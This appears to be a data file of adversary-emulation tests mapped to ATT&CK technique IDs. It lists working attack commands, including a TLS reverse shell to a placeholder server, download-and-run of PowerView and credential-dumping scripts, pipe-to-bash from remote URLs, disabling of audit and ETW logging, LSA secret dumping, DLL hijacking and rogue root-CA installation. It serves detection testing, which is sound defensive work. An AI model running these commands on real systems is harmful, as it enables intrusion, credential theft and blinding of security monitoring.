T1136,Azure AD - Create a new user,"connect-azuread $userprincipalname = ""#{userprincipalname}"" $username = ""#{username}"" $password = ""#{password}"" $passwordprofile = new-object -typename microsoft.open.azuread.model.passwordprofile $passwordprofile.password = $password new-azureaduser -displayname $username -passwordprofile $passwordprofile -userprincipalname $userprincipalname -accountenabled $true -mailnickname $username"
T1136,Azure AD - Create a new user via Azure CLI,"az login $userprincipalname = ""#{userprincipalname}"" $username = ""#{username}"" $password = ""#{password}"" az ad user create --display-name $username --password $password --user-principal-name $userprincipalname az ad user list --filter ""displayname eq 'atomicredteam'"""
T1574,DLL Search Order Hijacking - amsi.dll,copy %windir%\system32\windowspowershell\v1.0\powershell.exe %appdata%\updater.exe copy %windir%\system32\amsi.dll %appdata%\amsi.dll %appdata%\updater.exe -command exit
T1574,Phantom Dll Hijacking - WinAppXRT.dll,"copy %windir%\system32\amsi.dll %appdata%\amsi.dll ren %appdata%\amsi.dll winappxrt.dll copy %appdata%\winappxrt.dll %windir%\system32\winappxrt.dll reg add ""hkey_current_user\environment"" /v appx_process /t reg_expand_sz /d ""1"" /f"
T1574,Phantom Dll Hijacking - ualapi.dll,copy %windir%\system32\amsi.dll %appdata%\amsi.dll ren %appdata%\amsi.dll ualapi.dll copy %appdata%\ualapi.dll %windir%\system32\ualapi.dll sc config spooler start=auto
T1574,DLL Side-Loading using the Notepad++ GUP.exe binary,"""#{gup_executable}"""
T1574,DLL Side-Loading using the dotnet startup hook environment variable,"set dotnet_startup_hooks=""#{preloader_dll}"" dotnet -h > nul echo."
T1574,"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","write-host 1.downloading keyscrambler from official website to temp directory invoke-webrequest -uri ""https://download.qfxsoftware.com/download/latest/keyscrambler_setup.exe"" -outfile $env:temp\keyscrambler_setup.exe write-host 2.installing keyscrambler with keyscrambler_setup.exe from temp directory start-process -filepath $env:temp\keyscrambler_setup.exe -argumentlist /s -wait write-host 3.copying keyscrambler.exe to temp folder,to avoid permission issues, which calls keyscramblerie.dll in cwd i.e. temp copy-item ""c:\program files (x86)\keyscrambler\keyscrambler.exe"" -destination $env:temp\keyscrambler.exe write-host 4.executing keyscrambler.exe, you should see a popup of missing keyscramblerie.dll, you can close this popup start-process -filepath $env:temp\keyscrambler.exe write-host 5.a modified keyscramblerie.dll can be copied to temp, which can be misused by attacker"
T1552,Search Through Bash History,cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}
T1552,Search Through sh History,cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
T1059,Create and Execute Bash Shell Script,"sh -c ""echo 'echo hello from the atomic red team' > #{script_path}"" sh -c ""echo 'ping -c 4 #{host}' >> #{script_path}"" chmod +x #{script_path} sh #{script_path}"
T1059,Command-Line Interface,curl -ss https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.004/src/echo-art-fish.sh | bash wget --quiet -o - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.004/src/echo-art-fish.sh | bash
T1059,Harvest SUID executable files,chmod +x #{autosuid} bash #{autosuid}
T1059,LinEnum tool execution,chmod +x #{linenum} bash #{linenum}
T1059,New script file in the tmp directory,"tmpfile=$(mktemp) echo ""id"" > $tmpfile bash $tmpfile"
T1059,What shell is running,"echo $0 if $(env |grep ""shell"" >/dev/null); then env |grep ""shell""; fi if $(printenv shell >/dev/null); then printenv shell; fi"
T1059,What shells are available,cat /etc/shells
T1059,Command line scripts,"for i in $(seq 1 5); do echo ""$i, atomic red team was here!""; sleep 1; done"
T1059,Obfuscated command line scripts,"[ ""$(uname)"" = 'freebsd' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d"" art=$(echo -n ""id"" | $encodecmd) echo ""\$art=$art"" echo -n ""$art"" | $decodecmd |/bin/bash unset art"
T1059,Change login shell,"[ ""$(uname)"" = 'freebsd' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art cat /etc/passwd |grep ^art chsh -s /bin/sh art cat /etc/passwd |grep ^art"
T1059,Environment variable scripts,"export art='echo ""atomic red team was here... t1059.004""' echo $art |/bin/sh"
T1059,Detecting pipe-to-shell,cd /tmp curl -s #{remote_url} |bash ls -la /tmp/art.txt
T1059,Current kernel information enumeration,uname -srm
T1059,Shell Creation using awk command,"awk 'begin {system(""/bin/sh &"")}'"
T1059,Creating shell using cpan command,"echo '! exec ""/bin/sh &""' | perl_mm_use_default=1 cpan"
T1059,Shell Creation using busybox command,busybox sh &
T1059,emacs spawning an interactive system shell,"sudo emacs -q -nw --eval '(term ""/bin/sh &"")'"
T1069,Basic Permission Groups Discovery Windows (Domain),"net localgroup net group /domain net group ""enterprise admins"" /domain net group ""domain admins"" /domain"
T1069,Permission Groups Discovery PowerShell (Domain),get-adprincipalgroupmembership #{user} | select name
T1069,Elevated group enumeration using net group (Domain),"net groups ""account operators"" /domain net groups ""exchange organization management"" /domain net group ""builtin\backup operators"" /domain net group ""domain admins"" /domain"
T1069,Find machines where user has local admin access (PowerView),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); find-localadminaccess -verbose
T1069,Find local admins on all machines in domain (PowerView),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-enumeratelocaladmin -verbose
T1069,Find Local Admins via Group Policy (PowerView),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); find-gpocomputeradmin -computername #{computer_name} -verbose
T1069,Enumerate Users Not Requiring Pre Auth (ASRepRoast),get-aduser -f * -pr doesnotrequirepreauth | where {$_.doesnotrequirepreauth -eq $true}
T1069,Adfind - Query Active Directory Groups,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=group) #{optional_args}"
T1069,Enumerate Active Directory Groups with Get-AdGroup,get-adgroup -filter *
T1069,Enumerate Active Directory Groups with ADSISearcher,"([adsisearcher]""objectcategory=group"").findall(); ([adsisearcher]""objectcategory=group"").findone()"
T1069,Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),get-aduser -filter 'useraccountcontrol -band 4194304' -properties useraccountcontrol | format-table name
T1069,Get-DomainGroupMember with PowerView,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domaingroupmember ""domain admins"""
T1069,Get-DomainGroup with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domaingroup -verbose
T1069,Active Directory Enumeration with LDIFDE,ldifde.exe -f #{output_path}\#{output_file} -p subtree
T1069,Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS,"ldapsearch -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{user} -w #{password} -b ""cn=users,dc=#{domain},dc=#{top_level_domain}"" ""(objectclass=group)"" -s sub -a always -z 1000 dn"
T1505,Simulate Patching termsrv.dll,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""c:\windows\system32\termsrv.dll"" -destination ""c:\windows\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""c:\windows\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""c:\windows\system32\termsrv_backup.dll"" -destination ""c:\windows\system32\termsrv.dll"" -force -erroraction ignore"
T1505,Modify Terminal Services DLL Path,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path $termsrvdll -destination ""$home\atomictest.dll"" $newservicedll = ""$home\atomictest.dll"" $registrypath = ""hklm:\system\currentcontrolset\services\termservice\parameters"" # check if the registry key exists if (test-path -path $registrypath) { # modify the servicedll value in the registry set-itemproperty -path $registrypath -name ""servicedll"" -value $newservicedll write-host ""servicedll value in the registry has been updated to: $newservicedll"" } else { write-host ""registry key not found. make sure the 'termservice\parameters' key exists."" }"
T1573,OpenSSL C2,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1087,Enumerate all accounts (Domain),net user /domain net group /domain
T1087,Enumerate all accounts via PowerShell (Domain),net user /domain get-localgroupmember -group users get-aduser -filter *
T1087,Enumerate logged on users via CMD (Domain),query user /server:#{computer_name}
T1087,Automated AD Recon (ADRecon),"invoke-expression ""#{adrecon_path}"""
T1087,Adfind -Listing password policy,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
T1087,Adfind - Enumerate Active Directory Admins,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -sc admincountdmp #{optional_args}"
T1087,Adfind - Enumerate Active Directory User Objects,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=person) #{optional_args}"
T1087,Adfind - Enumerate Active Directory Exchange AD Objects,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -sc exchaddresses #{optional_args}"
T1087,Enumerate Default Domain Admin Details (Domain),net user administrator /domain
T1087,Enumerate Active Directory for Unconstrained Delegation,get-adobject -ldapfilter '(useraccountcontrol:1.2.840.113556.1.4.803:=#{uac_prop})' -server #{domain}
T1087,Get-DomainUser with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainuser -verbose
T1087,Enumerate Active Directory Users with ADSISearcher,"([adsisearcher]""objectcategory=user"").findall(); ([adsisearcher]""objectcategory=user"").findone()"
T1087,Enumerate Linked Policies In ADSISearcher Discovery,"(([adsisearcher]'(objectcategory=organizationalunit)').findall()).path | %{if(([adsi]""$_"").gplink){write-host ""[+] ou path:""([adsi]""$_"").path;$a=((([adsi]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){write-host ""policy path[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).path;write-host ""policy name[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).displayname} };write-output ""`n"" }}"
T1087,Enumerate Root Domain linked policies Discovery,"(([adsisearcher]'').searchroot).path | %{if(([adsi]""$_"").gplink){write-host ""[+] domain path:""([adsi]""$_"").path;$a=((([adsi]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){write-host ""policy path[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).path;write-host ""policy name[$i]:""([adsi]($a[$i]).substring(0,$a[$i].length-1)).displayname} };write-output ""`n"" }}"
T1087,WinPwn - generaldomaininfo,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') generaldomaininfo -noninteractive -consoleoutput
T1087,Kerbrute - userenum,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe userenum -d #{domain} --dc #{domaincontroller} ""pathtoatomicsfolder\..\externalpayloads\username.txt"""
T1087,Wevtutil - Discover NTLM Users Remote,"$target = $env:logonserver $target = $target.trim(""\\"") $ipaddress = [system.net.dns]::gethostaddresses($target) | select ipaddresstostring -expandproperty ipaddresstostring wmic.exe /node:$ipaddress process call create 'wevtutil epl security c:\\ntlmusers.evtx /q:\""event[system[(eventid=4776)]]""'"
T1087,Suspicious LAPS Attributes Query with Get-ADComputer all properties,get-adcomputer #{hostname} -properties *
T1087,Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"get-adcomputer #{hostname} -properties ms-mcs-admpwd, ms-mcs-admpwdexpirationtime"
T1087,Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"get-adcomputer -searchscope subtree -filter ""name -like '*'"" -properties *"
T1087,Suspicious LAPS Attributes Query with adfind all properties,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *"
T1087,Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" ms-mcs-admpwd, ms-mcs-admpwdexpirationtime"
T1087,Active Directory Domain Search,"ldapsearch -h ldap://#{domain}.#{top_level_domain}:389 -x -d #{user} -w #{password} -b ""cn=users,dc=#{domain},dc=#{top_level_domain}"" -s sub -a always -z 1000 dn"
T1087,Account Enumeration with LDAPDomainDump,ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/t1087
T1222,Enable Local and Remote Symbolic Links via fsutil,fsutil behavior set symlinkevaluation r2l:1 fsutil behavior set symlinkevaluation r2r:1
T1222,Enable Local and Remote Symbolic Links via reg.exe,"reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetolocalevaluation /t reg_dword /d ""1"" /f reg add ""hklm\system\currentcontrolset\control\filesystem"" /v symlinkremotetoremoteevaluation /t reg_dword /d ""1"" /f"
T1222,Enable Local and Remote Symbolic Links via Powershell,new-itemproperty -path hklm:\software\policies\microsoft\windows\filesystems\ntfs -name symlinkremotetolocalevaluation -propertytype dword -value 1 -force -erroraction ignore new-itemproperty -path hklm:\software\policies\microsoft\windows\filesystems\ntfs -name symlinkremotetoremoteevaluation -propertytype dword -value 1 -force -erroraction ignore
T1553,Install root CA on CentOS/RHEL,"openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/c=us/st=denial/l=springfield/o=dis/cn=www.example.com"" -out #{cert_filename} cp #{cert_filename} /etc/pki/ca-trust/source/anchors/ update-ca-trust"
T1553,Install root CA on FreeBSD,"openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/c=us/st=denial/l=springfield/o=dis/cn=www.example.com"" -out #{cert_filename} cp #{cert_filename} /usr/local/share/certs/ certctl rehash"
T1553,Install root CA on Debian/Ubuntu,mv #{cert_filename} /usr/local/share/ca-certificates sudo update-ca-certificates
T1553,Install root CA on macOS,"sudo security add-trusted-cert -d -r trustroot -k ""/library/keychains/system.keychain"" ""#{cert_filename}"""
T1553,Install root CA on Windows,"$cert = import-certificate -filepath #{pfx_path} -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root"""
T1553,Install root CA on Windows with certutil,certutil -addstore my #{pfx_path}
T1553,Add Root Certificate to CurrentUser Certificate Store,iex (iwr 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1553.004/src/remotecerttrust.ps1' -usebasicparsing)
T1001,Steganographic Tarball Embedding,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte"
T1001,Embedded Script in Image Execution via Extract-Invoke-PSImage,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""#{image_file}"" -out ""$home\result.ps1"" $scriptcontent = get-content ""$home\result.ps1"" -raw $base64pattern = ""(?<=^|[^a-za-z0-9+/])(?:[a-za-z0-9+/]{4})*(?:[a-za-z0-9+/]{2}(==)?|[a-za-z0-9+/]{3}=)?(?=$|[^a-za-z0-9+/])"" $base64strings = [regex]::matches($scriptcontent, $base64pattern) | foreach-object { $_.value } $base64strings | set-content ""$home\decoded.ps1"" $decodedcontent = get-content ""$home\decoded.ps1"" -raw $decodedtext = [system.text.encoding]::utf8.getstring([system.convert]::frombase64string($decodedcontent)) $textpattern = '^.+' $textmatches = [regex]::matches($decodedtext, $textpattern) | foreach-object { $_.value } $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1001,Execute Embedded Script in Image via Steganography,"cat ""#{script}"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""#{image}"" - > ""#{evil_image}""; strings ""#{evil_image}"" | tail -n 1 | base64 -d | sh"
T1562,Disable Windows IIS HTTP Logging,"c:\windows\system32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontlog:true"
T1562,Disable Windows IIS HTTP Logging via PowerShell,"set-webconfigurationproperty -pspath ""iis:\sites\#{website_name}\"" -filter ""system.webserver/httplogging"" -name dontlog -value $true"
T1562,Kill Event Log Service Threads,"set-executionpolicy -scope currentuser -executionpolicy remotesigned -erroraction ignore $url = ""https://raw.githubusercontent.com/hlldz/invoke-phant0m/f1396c411a867e1b471ef80c5c534466103440e0/invoke-phant0m.ps1"" $output = ""$env:temp\invoke-phant0m.ps1"" $wc = new-object system.net.webclient $wc.downloadfile($url, $output) cd $env:temp import-module .\invoke-phant0m.ps1 invoke-phant0m"
T1562,Impair Windows Audit Log Policy,"auditpol /set /category:""account logon"" /success:disable /failure:disable auditpol /set /category:""logon/logoff"" /success:disable /failure:disable auditpol /set /category:""detailed tracking"" /success:disable"
T1562,Clear Windows Audit Policy Config,auditpol /clear /y auditpol /remove /allusers
T1562,Disable Event Logging with wevtutil,"wevtutil sl ""#{log_name}"" /e:false"
T1562,Makes Eventlog blind with Phant0m,"""#{file_name}"""
T1562,Modify Event Log Channel Access Permissions via Registry - PowerShell,"set-itemproperty -path #{channelpath} -name ""channelaccess"" -value ""o:syg:syd:(d;;0x1;;;wd)"" restart-service -name eventlog -force -erroraction ignore"
T1562,Modify Event Log Channel Access Permissions via Registry 2 - PowerShell,"new-item -path #{channelpath} -force set-itemproperty -path #{channelpath} -name ""channelaccess"" -value ""o:syg:syd:(d;;0x1;;;wd)"" restart-service -name eventlog -force -erroraction ignore"
T1562,Modify Event Log Access Permissions via Registry - PowerShell,"set-itemproperty -path #{customsdpath} -name ""customsd"" -value ""o:syg:syd:(d;;0x1;;;wd)"""
T1055,Process Hollowing using PowerShell,". ""#{script_path}"" $ppid=get-process #{parent_process_name} | select -expand id start-hollow -sponsor ""#{sponsor_binary_path}"" -hollow ""#{hollow_binary_path}"" -parentpid $ppid -verbose"
T1055,RunPE via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1055.012\src\t1055.012-macrocode.txt"" -officeproduct ""#{ms_product}"" -sub ""exploit"""
T1055,Process Hollowing in Go using CreateProcessW WinAPI,"$pathtoatomicsfolder\t1055.012\bin\x64\createprocess.exe -program ""#{hollow_binary_path}"" -debug"
T1055,Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012),"$pathtoatomicsfolder\t1055.012\bin\x64\createprocesswithpipe.exe -program ""#{hollow_binary_path}"" -debug"
T1036,Space After Filename,"mkdir -p /tmp/atomic-test-t1036.006 cd /tmp/atomic-test-t1036.006 mkdir -p 'testdirwithspaceend ' [ ""$(uname)"" = 'freebsd' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running t1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running t1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null chmod +x 'testdirwithspaceend /init ' './testdirwithspaceend /init '"
T1053,Create Systemd Service and Timer,"echo ""[unit]"" > #{path_to_systemd_service} echo ""description=atomic red team systemd timer service"" >> #{path_to_systemd_service} echo ""[service]"" >> #{path_to_systemd_service} echo ""type=simple"" >> #{path_to_systemd_service} echo ""execstart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service} echo ""[install]"" >> #{path_to_systemd_service} echo ""wantedby=multi-user.target"" >> #{path_to_systemd_service} echo ""[unit]"" > #{path_to_systemd_timer} echo ""description=executes atomic red team systemd timer service"" >> #{path_to_systemd_timer} echo ""requires=#{systemd_service_name}"" >> #{path_to_systemd_timer} echo ""[timer]"" >> #{path_to_systemd_timer} echo ""unit=#{systemd_service_name}"" >> #{path_to_systemd_timer} echo ""oncalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer} echo ""[install]"" >> #{path_to_systemd_timer} echo ""wantedby=timers.target"" >> #{path_to_systemd_timer} systemctl start #{systemd_timer_name} systemctl enable #{systemd_timer_name} systemctl daemon-reload"
T1053,Create a user level transient systemd service and timer,"systemd-run --user --unit=atomic-red-team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'"
T1053,Create a system level transient systemd service and timer,"systemd-run --unit=atomic-red-team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'"
T1078,Creating GCP Service Account and Service Account Key,gcloud config set project #{project-id} gcloud iam service-accounts create #{service-account-name} gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
T1078,Azure Persistence Automation Runbook Created or Modified,new-azautomationrunbook -name #{runbook_name} -type powershell -resourcegroupname #{resource_group} -description 'my-test-runbook' -automationaccountname #{automation_account_name}
T1078,GCP - Create Custom IAM Role,"gcloud config set project #{project-id} gcloud iam roles create #{role-name} --description=""#{role-description}"" --permissions=#{roles} --project=#{project-id}"
T1195,Simulate npm package installation on a Linux system,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1003,Cached Credential Dump via Cmdkey,cmdkey /list
T1027,HTML Smuggling Remote Payload,"& ""pathtoatomicsfolder\t1027.006\bin\t1027_006_remote.html"""
T1562,Auditing Configuration Changes on Linux Host,"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name} if [ -f ""/etc/#{auditd_config_file_name}"" ]; then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name} else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name} fi sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}"
T1562,Auditing Configuration Changes on FreeBSD Host,echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}
T1562,Logging Configuration Changes on Linux Host,"if [ -f ""/etc/#{syslog_config_file_name}"" ]; then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name} fi if [ -f ""/etc/#{rsyslog_config_file_name}"" ]; then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name} fi if [ -f ""/etc/syslog-ng/#{syslog_ng_config_file_name}"" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name} fi"
T1562,Logging Configuration Changes on FreeBSD Host,"if [ -f ""/etc/#{syslog_config_file_name}"" ]; then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name} fi"
T1562,Disable Powershell ETW Provider - Windows,"cmd /c ""#{ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""#{session}"" --p ""#{provider}"" -ets"
T1562,Disable .NET Event Tracing for Windows Via Registry (cmd),reg add hklm\software\microsoft\.netframework /v etwenabled /t reg_dword /d 0
T1562,Disable .NET Event Tracing for Windows Via Registry (powershell),"new-itemproperty -path hklm:\software\microsoft\.netframework -name etwenabled -value 0 -propertytype ""dword"" -force"
T1562,LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"reg add ""hklm\software\microsoft\windows\currentversion\winevt\channels\microsoft-windows-windows defender/operational"" /v enabled /t reg_dword /d 0 /f"
T1562,LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"new-itemproperty ""hklm:\software\microsoft\windows\currentversion\winevt\channels\microsoft-windows-windows defender/operational"" -name enabled -propertytype dword -value 0 -force"
T1562,Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - Cmd,reg add hkcu\environment /v complus_etwenabled /t reg_sz /d 0 /f
T1562,Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell,"new-itemproperty -path hkcu:\environment -name complus_etwenabled -value 0 -propertytype ""string"" -force"
T1562,Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd,"reg add ""hklm\system\currentcontrolset\control\session manager\environment"" /v complus_etwenabled /t reg_sz /d 0 /f"
T1562,Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell,"new-itemproperty -path ""hklm:\system\currentcontrolset\control\session manager\environment"" -name complus_etwenabled -value 0 -propertytype ""string"" -force"
T1562,Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table,"add-dnsclientnrptrule -namespace "".endpoint.security.microsoft.com"" -nameservers 127.0.0.1 -comment ""silenced by name resolution policy table"" add-dnsclientnrptrule -namespace ""endpoint.security.microsoft.com"" -nameservers 127.0.0.1 -comment ""silenced by name resolution policy table"" clear-dnsclientcache"
T1547,Print Processors,"if( $(get-service -name spooler).starttype -eq ""disabled"") {set-service -name ""spooler"" -startuptype automatic} net stop spooler copy-item ""$pathtoatomicsfolder\t1547.012\bin\atomictest.dll"" c:\windows\system32\spool\prtprocs\x64\atomictest.dll reg add ""hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam"" /v ""driver"" /d ""atomictest.dll"" /t reg_sz /f net start spooler if(#{restart}){ restart-computer }"
T1003,Dumping LSA Secrets,"""#{psexec_exe}"" -accepteula -s reg save hklm\security\policy\secrets %temp%\secrets /y"
T1003,Dump Kerberos Tickets from LSA using dumper.ps1,invoke-expression (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mzhmo/powershellkerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
T1574,powerShell Persistence via hijacking default modules - Get-Variable.exe,"c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /out:""$env:localappdata\microsoft\windowsapps\get-variable.exe"" ""pathtoatomicsfolder\t1574.008\bin\calc.cs"" powershell -noprofile"
T1559,Execute PowerShell script via Word DDE,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx"""
T1087,Enumerate all accounts (Local),cat /etc/passwd > #{output_file} cat #{output_file}
T1087,View sudoers access,if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi; if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi; cat #{output_file}
T1087,View accounts with UID 0,grep 'x:0:' /etc/passwd > #{output_file} grep '*:0:' /etc/passwd >> #{output_file} cat #{output_file} 2>/dev/null
T1087,List opened files by user,username=$(id -u -n) && lsof -u $username
T1087,Show if a user account has ever logged in remotely,"[ ""$(uname)"" = 'freebsd' ] && cmd=""lastlogin"" || cmd=""lastlog"" $cmd > #{output_file} cat #{output_file}"
T1087,Enumerate users and groups,groups id
T1087,Enumerate users and groups,dscl . list /groups dscl . list /users dscl . list /users | grep -v '_' dscacheutil -q group dscacheutil -q user
T1087,Enumerate all accounts on Windows (Local),"net user dir c:\users\ cmdkey.exe /list net localgroup ""users"" net localgroup"
T1087,Enumerate all accounts via PowerShell (Local),net user get-localuser get-localgroupmember -group users cmdkey.exe /list ls c:/users get-childitem c:\users\ dir c:\users\ get-localgroup net localgroup
T1087,Enumerate logged on users via CMD (Local),query user
T1087,ESXi - Local Account Discovery via ESXCLI,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system account list"""
